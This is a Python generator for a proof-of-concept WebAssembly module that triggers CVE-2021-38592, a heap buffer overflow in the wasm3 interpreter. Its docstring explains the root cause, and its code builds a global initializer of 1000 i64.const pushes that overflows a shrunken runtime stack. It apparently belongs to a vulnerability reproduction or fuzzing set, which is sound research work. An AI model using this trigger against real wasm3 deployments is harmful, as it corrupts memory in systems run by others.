"""S2: wasm3 (CVE-2021-38592) trigger-module generator.

The vulnerable code path (fixed upstream in commit ``8f3986a``, message
"TouchSlot should track slots outside of functions", OSS-Fuzz #33554) fails to
track the maximum stack height of module-level (global-initializer) code: the
stack-overflow guard in ``EvaluateExpression`` compares ``o->maxStackSlots``
(which stays 0 when ``o->function == NULL``) against the runtime stack size,
so a global initializer long enough to exceed the runtime stack runs instead
of trapping, and ``op_Const64`` writes past the heap-allocated runtime stack
-- exactly the fault class of CVE-2021-38592 ("heap-based buffer overflow in
op_Const64, called from EvaluateExpression and m3_LoadModule").

The trigger is a single i64 global whose initializer is a *linear* sequence of
``i64.const 1`` (module-level expressions are restricted to const/getGlobal/
end), with the runtime stack shrunk to 4096 bytes (512 slots) via the CLI's
``--stack-size`` so 1000 constants (2000 runtime slots) overflow it.
"""

from __future__ import annotations

WASM_MAGIC = b"\x00asm"
WASM_VERSION = b"\x01\x00\x00\x00"
SEC_GLOBAL = 6
VAL_I64 = 0x7E
GLOBAL_MUT_CONST = 0x00
OP_I64_CONST = 0x42
OP_END = 0x0B


def _uleb(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def trigger_wasm(depth: int = 1000) -> bytes:
    """One global, ``depth`` i64.const pushes, then end (the full module)."""
    body = _uleb(1)  # one global
    body += bytes([VAL_I64, GLOBAL_MUT_CONST])
    for _ in range(depth):
        body += bytes([OP_I64_CONST]) + _uleb(1)
    body += bytes([OP_END])
    section = bytes([SEC_GLOBAL]) + _uleb(len(body)) + body
    return WASM_MAGIC + WASM_VERSION + section


def harmless_module(depth: int = 2) -> bytes:
    """A benign small module (same shape, safe depth) for seed directories."""
    return trigger_wasm(depth)
